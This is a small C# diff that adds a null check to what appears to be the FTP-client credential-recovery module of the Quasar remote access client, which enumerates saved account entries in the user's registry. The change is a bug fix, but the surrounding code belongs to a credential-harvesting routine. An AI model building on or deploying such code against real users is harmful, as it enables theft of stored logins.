@@ -23,6 +23,10 @@ namespace Quasar.Client.Recovery.FtpClients
 
                 using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
                 {
+                    if (key == null)
+                    {
+                        return data;
+                    }
                     foreach (String subkeyName in key.GetSubKeyNames())
                     {
                         using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName))
